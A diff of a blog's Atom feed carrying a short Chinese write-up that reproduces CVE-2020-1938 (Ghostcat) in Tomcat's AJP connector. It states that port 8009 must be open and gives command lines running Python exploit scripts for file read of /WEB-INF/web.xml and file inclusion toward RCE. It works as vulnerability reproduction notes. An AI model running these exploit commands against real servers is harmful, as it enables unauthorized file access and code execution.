@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2020-02-21T10:20:56.167Z</updated>
+    <updated>2020-02-21T10:21:35.940Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
@@ -25,29 +25,17 @@
 </ul>
 <h3 id="0x02-前提">0x02 前提</h3>
 <ul>
-<li>
-<ol>
 <li>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</li>
-</ol>
-</li>
 </ul>
 <h3 id="0x03-文件读取文件包含rce">0x03 文件读取&amp;文件包含RCE</h3>
 <ul>
-<li>
-<ol>
 <li>文件读取</li>
-</ol>
-</li>
 </ul>
 <pre><code>python2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 127.0.0.1
 </code></pre>
 <figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1582271986826.png" alt="" loading="lazy"></figure>
 <ul>
-<li>
-<ol start="2">
 <li>文件包含</li>
-</ol>
-</li>
 </ul>
 <pre><code>python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 127.0.0.1
 </code></pre>
